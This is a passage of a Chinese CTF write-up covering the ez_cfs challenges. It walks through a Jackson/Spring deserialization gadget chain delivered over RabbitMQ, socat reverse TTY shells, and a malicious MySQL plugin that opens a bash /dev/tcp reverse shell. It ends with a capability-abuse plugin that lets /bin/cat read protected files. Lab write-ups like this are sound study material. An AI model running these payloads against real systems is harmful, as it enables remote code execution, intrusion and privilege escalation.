+        <span class="token class-name">TemplatesImpl</span> templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"{java.lang.Runtime.getRuntime().exec(\"%s\"); throw new org.springframework.amqp.AmqpRejectAndDontRequeueException(\"err\");}"</span><span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">// 利用 Javaassist 动态创建 TemplatesImpl 恶意类</span>
+        <span class="token class-name">CtClass</span> clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"TemplatesEvilClass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">// 设置 Super Class 为 AbstractTranslet</span>
+        <span class="token class-name">CtClass</span> superClazz <span class="token operator">=</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        clazz<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">// 创建无参 Constructor, 写入 Runtime.exec</span>
+        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        clazz<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">// 将 Runtime.exec 直接写入 static 代码块</span>
+<span class="token comment">//        clazz.makeClassInitializer().setBody(body);</span>
+
+        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>clazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">return</span> templatesImpl<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getByteCode</span><span class="token punctuation">(</span><span class="token class-name">Class</span> clazz<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
+        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">CtClass</span> c <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>Reflection<span class="hexo-wm">𝒔‍³𝘷ℯn․​si​𝒕𝐞​‍</span>s.java</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Reflections</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> val<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>
+        <span class="token class-name">Field</span> f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">invokeMethod</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> parameterTypes<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>
+        <span class="token class-name">Method</span> m <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> parameterTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>MessageContro<span class="hexo-wm">ꜱ‍⑶ⅴｅn․​‌ѕⅈ​‌𝒕ｅ‌​</span>ller.java</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> sendPoc <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
+
+        <span class="token class-name">TemplatesImpl</span> templatesImpl <span class="token operator">=</span> <span class="token class-name">Gadgets</span><span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">AdvisedSupport</span> as <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        as<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">AdvisedSupport</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">InvocationHandler</span> jdkDynamicAopProxyHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>as<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Templates</span> templatesProxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> jdkDynamicAopProxyHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">POJONode</span> pojoNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>templatesProxy<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">BadAttributeValueExpException</span> poc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>poc<span class="token punctuation">,</span> <span class="token string">"val"</span><span class="token punctuation">,</span> pojoNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        messageSenderService<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+<span class="token punctuation">}</span></code></pre>
+<h3 id="1-2-注意点："><a href="#1-2-注意点：" class="headerlink" title="1.2 注意点："></a>1.2 注意点：</h3><h4 id="1-2-1-删除-BaseJsonNode-writeReplace"><a href="#1-2-1-删除-BaseJsonNode-writeReplace" class="headerlink" title="1.2.1 删除 BaseJsonNode.writeReplace"></a>1.2.1 删除 BaseJsonNode.writeReplace</h4><p>使用原本的 BaseJsonNode <span class="hexo-wm">𝒔‌³𝘷𝘦ｎ·‍𝒔𝐢﻿﻿𝘵𝐞​</span>的话，在发送消息序列化的时候会调用 <code>BaseJsonNode.writeReplace()</code> ，最后也会调用 <code>TemplatesImpl.getOutputProperties()</code> 触发命令执行</p>
+<p>但是这里触发后会报错 <code>NullPointerException</code> ，导致消息传递中断</p>
+<p>删除掉 <code>BaseJsonNode.writeReplace()</code> 就调用的是 <code>UnmodifiableRandomAccessList.writeReplace()</code> ，消息能继续传递</p>
+<h4 id="1-2-2-抛出-AmqpRejectAndDontRequeueException-异常"><a href="#1-2-2-抛出-AmqpRejectAndDontRequeueException-异常" class="headerlink" title="1.2.2 抛出 AmqpRejectAndDontRequeueException 异常"></a>1.2.2 抛出 AmqpRejectAndDontRequeueException 异常</h4><p>因为在执行 <code>Jackson</code> 链时必然会出现报错，导致消息处理不成功，<span class="hexo-wm">𝘴﻿3𝐯𝘦𝐧∙‍‍sｉ‍‌𝒕e‍‍</span>就会让消息重新排队处理，然后又报错，陷入死循环。</p>
+<p>抛出这个异常可以避免无限次<span class="hexo-wm">s﻿𝟯vｅ𝐧·﻿ꜱⅈ​‍𝒕𝐞‌</span>地重试失败的消息，节约系统资源。</p>
+<h4 id="1-2-3-消息未处理，删除队列"><a href="#1-2-3-消息未处理，删除队列" class="headerlink" title="1.2.3 消息未处理，删除队列"></a>1.2.3 消息未处理，删除队列</h4><p>由于消息处理失败，还是会留存在队中，处于 <code>unacked</code> 状态，当测试程序再次启动时，<span class="hexo-wm">𝐬‍‌³𝒗en∙​ꜱｉ﻿𝘵𝐞​‍</span>就会优先处理队列中留存消息。</p>
+<p>所以在复现过程中如果队列中还留存有上一次测试的消息，<span class="hexo-wm">𝒔‌​𝟯𝒗ｅ𝒏∙﻿ꜱ𝐢​﻿𝐭ｅ﻿‌</span>可以把队列删除重新创建。 </p>
+<h2 id="2-ez-cfs-part2"><a href="#2-ez-cfs-part2" class="headerlink" title="2. ez_cfs_part2"></a>2. ez_cfs_part2</h2><p>比较典型的内网横向渗透</p>
+<h3 id="2-1-探查内网环境"><a href="#2-1-探查内网环境" class="headerlink" title="2.1 探查内网环境"></a>2.1 探查内网环境</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/hosts</code></pre>
+<p>可以看出 server 处于两个内网 Network 中，使用 Nmap 对相应子段进行扫描，发现存在一台 MySQL 容器<br>如果直接在反弹的 Shell 上调用 mysql-<span class="hexo-wm">𝐬﻿​𝟯𝘷ｅ𝒏·​𝐬ｉ​t℮‍​</span>client 是无法正常输入密码和连接的，<br>这是因为反弹的 Shell 一般没有分配 tty</p>
+<h3 id="2-2-反弹-tty"><a href="#2-2-反弹-tty" class="headerlink" title="2.2 反弹 tty"></a>2.2 反弹 tty</h3><p>使用 socat <span class="hexo-wm">𝘀‌﻿⑶ⅴ℮ｎ.‍​𝐬ⅈ﻿𝐭ｅ‌</span>工具可以反弹 tty</p>
+<p>socat_l<span class="hexo-wm">𝐬​𝟯ⅴe𝘯·‌‌ꜱｉ​​tｅ﻿​</span>isten.sh</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">socat file:<span class="token variable"><span class="token variable">`</span><span class="token function">tty</span><span class="token variable">`</span></span>,raw,echo<span class="token operator">=</span><span class="token number">0</span> tcp-listen:<span class="token operator">&lt;</span>listen_port<span class="token operator">&gt;</span></code></pre>
+<p>socat_sh<span class="hexo-wm">ꜱ‍​⑶v𝘦ｎ∙‌𝘀ｉ​‌𝒕𝘦‍﻿</span>ell.sh</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">socat tcp:<span class="token operator">&lt;</span>server<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>listen_port<span class="token operator">&gt;</span> exec:<span class="token string">'bash -li'</span>,pty,stderr,setsid,sigint,sane</code></pre>
+<p>反弹 tty <span class="hexo-wm">ѕ‌‌³𝒗℮𝐧•‌ѕｉ‌𝘵℮‍​</span>后即可正常连接 MySQL</p>
+<h3 id="2-3-连接-MySQL"><a href="#2-3-连接-MySQL" class="headerlink" title="2.3 连接 MySQL"></a>2.3 连接 MySQL</h3><pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-h</span> <span class="token operator">&lt;</span>mysql_server_ip<span class="token operator">&gt;</span> <span class="token parameter variable">-u</span> root <span class="token parameter variable">-p</span></code></pre>
+<p>简单尝试发现口令为 <code>root:root</code> ，<br>登录后即可在 ctf <span class="hexo-wm">𝘴​³v𝘦𝒏·‌sｉ﻿﻿𝘵ｅ‍﻿</span>数据库的 flag 表中获得 flag_2</p>
+<blockquote>
+<p>PS：由于靶机环境可以联网，<span class="hexo-wm">𝘴‌﻿𝟯ⅴ𝐞𝒏•​﻿𝐬𝘪﻿𝘵e﻿</span>本题也可以使用其他可用于连接 MySQL 且无需 tty 即可进行交互的工具完成</p>
+</blockquote>
+<h2 id="3-ez-cfs-part3"><a href="#3-ez-cfs-part3" class="headerlink" title="3. ez_cfs_part3"></a>3. ez_cfs_part3</h2><blockquote>
+<p>原题是 2023 N1CTF lolita <span class="hexo-wm">𝘴​𝟯𝒗e𝘯·‌﻿𝘀i‍𝘵℮​</span>出的 ez_maria<br>本题使用了 ProxySQL 替代了原题的 PHP preg_match 作为 waf ，其本质和解题过程还是一样的</p>
+</blockquote>
+<p>简单尝试后发现 mysql 过滤了一部分关键词，<span class="hexo-wm">s‍‍3ⅴen․‌s𝐢﻿​𝒕𝘦‍</span>这里使用加载 shell 插件来反弹 shell</p>
+<h3 id="3-1-恢复-skip-grant-tables"><a href="#3-1-恢复-skip-grant-tables" class="headerlink" title="3.1 恢复 skip-grant-tables"></a>3.1 恢复 skip-grant-tables</h3><p>恢复 mysql 的表，因为使用 skip-grant-tables 启动，缺失 mysql 表，无法使用插件</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">mysql <span class="token operator">&gt;</span> <span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> mysql<span class="token punctuation">;</span>
+mysql <span class="token operator">&gt;</span> <span class="token keyword">use</span> mysql<span class="token punctuation">;</span>
+mysql <span class="token operator">&gt;</span> <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> plugin <span class="token punctuation">(</span> name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token string">''</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span> dl <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token string">''</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span>Aria transactional<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8mb3 <span class="token keyword">COLLATE</span> utf8mb3_general_ci <span class="token keyword">comment</span><span class="token operator">=</span><span class="token string">'MySQL plugins'</span><span class="token punctuation">;</span></code></pre>
+<h3 id="3-2-MySQL-Plugin-RCE"><a href="#3-2-MySQL-Plugin-RCE" class="headerlink" title="3.2 MySQL Plugin RCE"></a>3.2 MySQL Plugin RCE</h3><p>编写插件</p>
+<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
+
+<span class="token keyword">void</span> <span class="token function">lshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 &amp;'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">LIN</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span><span class="token operator">:</span>
+        <span class="token function">LIN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token function">lshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+LIN lin<span class="token punctuation">;</span>
+LIN<span class="token operator">*</span> _mysql_plugin_interface_version_ <span class="token operator">=</span> <span class="token operator">&amp;</span>lin<span class="token punctuation">;</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">g++ lin.cpp <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-o</span> lin.so</code></pre>
+<p>将编译出来的 so 文件用 <span class="hexo-wm">ѕ﻿³vｅｎ•﻿﻿ꜱ𝐢‌​ｔ𝐞﻿‌</span>dumpfile 写到 /usr/lib/mysql/plugin/ 目录</p>
+<pre class="language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"lin.so"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
+sql <span class="token operator">=</span> <span class="token string">"select unhex('"</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'%02X'</span> <span class="token operator">%</span> b <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"') into dumpfile '/usr/lib/mysql/plugin/lin.so';"</span>
+f2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"payload.sql"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
+f2<span class="token punctuation">.</span>write<span class="token punctuation">(</span>sql<span class="token punctuation">)</span></code></pre>
+<p>将 payload.sql <span class="hexo-wm">𝘴​𝟯vℯ𝘯․﻿s𝘪‍‍𝒕e﻿</span>上传至 client 端并运行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token operator">&gt;</span> <span class="token builtin class-name">source</span> payload.sql<span class="token punctuation">;</span></code></pre>
+<p>最后安装插件反<span class="hexo-wm">𝘀‍3ⅴℯ𝘯·‍​si​𝐭𝐞‍</span>弹shell</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token operator">&gt;</span> INSTALL PLUGIN plugin_name SONAME <span class="token string">'lin.so'</span></code></pre>
+<h2 id="4-ez-cfs-part4"><a href="#4-ez-cfs-part4" class="headerlink" title="4. ez_cfs_part4"></a>4. ez_cfs_part4</h2><p>可以看到 <code>/flag_4</code> 没有权限读取，找 <code>suid</code> 和 <code>cap</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
+getcap <span class="token parameter variable">-r</span> / <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">/usr/bin/mariadb <span class="token assign-left variable">cap_setfcap</span><span class="token operator">=</span>ep</code></pre>
+<p>可以看到 <code>/usr/bin/mariadb</code> 有 <code>cap_setfcap</code> 权限<br>也就是我们能给其他文件设置 <code>cap</code><br>给 maria<span class="hexo-wm">s﻿‍⑶𝒗ｅ𝐧∙﻿​𝘴𝘪‌𝒕𝘦‍</span>db 写个插件</p>
+<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/capability.h&gt;</span></span>
+
+<span class="token keyword">void</span> <span class="token function">lshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    cap_t caps <span class="token operator">=</span> <span class="token function">cap_from_text</span><span class="token punctuation">(</span><span class="token string">"cap_dac_override=eip"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">cap_set_file</span><span class="token punctuation">(</span><span class="token string">"/bin/cat"</span><span class="token punctuation">,</span> caps<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"setcap finished\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">LIN</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span><span class="token operator">:</span>
+        <span class="token function">LIN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token function">lshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+LIN _mysql_client_plugin_declaration_<span class="token punctuation">;</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">g++ cap.cpp <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-o</span> cap.so <span class="token parameter variable">-lcap2</span></code></pre>
+<p>将编译出来的文件传到靶机,<br>然后加载这个 so 让 <code>/bin/cat</code> 获取 <code>cap_dac_override</code>（忽略文件权限）的特权</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mariadb --plugin-dir<span class="token operator">=</span>. --default-auth<span class="token operator">=</span>cap
+<span class="token function">cat</span> /flag_4</code></pre>
+</body></html>
+        </div>
+        
+          <div class="prev-or-next">
+            <div class="post-foot-next">
+              
+                <a href="../2024-n1ctf-junior-writeup/" target="_self">
+                  <i class="iconfont icon-chevronleft"></i>
+                  <span>上一页</span>
+                </a>
+              
+            </div>
+            <div class="post-foot-prev">
+              
+                <a href="../2024-dubhectf-writeup/" target="_self">
+                  <span>下一页</span>
+                  <i class="iconfont icon-chevronright"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </div>
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="catalog-zoom">
+      <div class="title">目录</div>
+      <div class="catalog-content">
+        
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%94%E8%B5%9B%E4%BB%8B%E7%BB%8D"><span class="toc-text">比赛介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%94%E8%B5%9B%E6%A6%82%E5%86%B5"><span class="toc-text">比赛概况</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1-php-hacker"><span class="toc-text">Week1 - php_hacker</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-POC"><span class="toc-text">1. POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2"><span class="toc-text">2. &lt;command&gt;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1-attack-shiro"><span class="toc-text">Week1 - attack_shiro</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%88%86%E7%A0%B4-shiro-%E5%AF%86%E9%92%A5"><span class="toc-text">1. 爆破 shiro 密钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%88%86%E7%A0%B4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F"><span class="toc-text">2. 爆破反序列化利用链及回显方式</span></a></li><li 